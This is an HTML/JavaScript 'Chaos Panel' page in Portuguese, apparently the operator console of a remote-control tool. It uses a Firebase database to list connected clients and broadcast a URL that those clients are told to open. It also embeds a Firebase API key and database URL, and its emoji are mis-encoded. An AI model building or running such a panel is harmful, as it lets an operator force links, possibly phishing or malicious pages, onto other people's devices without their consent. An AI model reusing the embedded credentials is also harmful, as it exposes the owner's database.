<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Painel do Caos ğŸ˜ˆ</title>
</head>
<body style="background:black;color:lime;font-family:monospace;padding:20px">

<h2>Painel do Caos ğŸ˜ˆ</h2>

<h3>ğŸ‘¥ Conectados:</h3>
<ul id="lista"></ul>

<hr>

<input id="link" placeholder="Cole o link aqui" style="width:100%;padding:10px">
<br><br>
<button onclick="enviar()" style="padding:10px;width:100%">
Mandar abrir
</button>

<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>

<script>
const firebaseConfig = {
  apiKey: "AIzaSyCCz1Z1pg95O0NER7_IRKoJ0mDqPgWaW-o",
  databaseURL: "https://painel-caos-default-rtdb.firebaseio.com"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

// LISTA CONECTADOS
db.ref("conectados").on("value", snap => {
  const lista = document.getElementById("lista");
  lista.innerHTML = "";

  const dados = snap.val();
  if (!dados) {
    lista.innerHTML = "<li>NinguÃ©m conectado</li>";
    return;
  }

  Object.keys(dados).forEach(id => {
    const li = document.createElement("li");
    li.textContent = id;
    lista.appendChild(li);
  });
});

function enviar() {
  const url = document.getElementById("link").value;
  db.ref("comando").set(url);
}
</script>

</body>
</html>
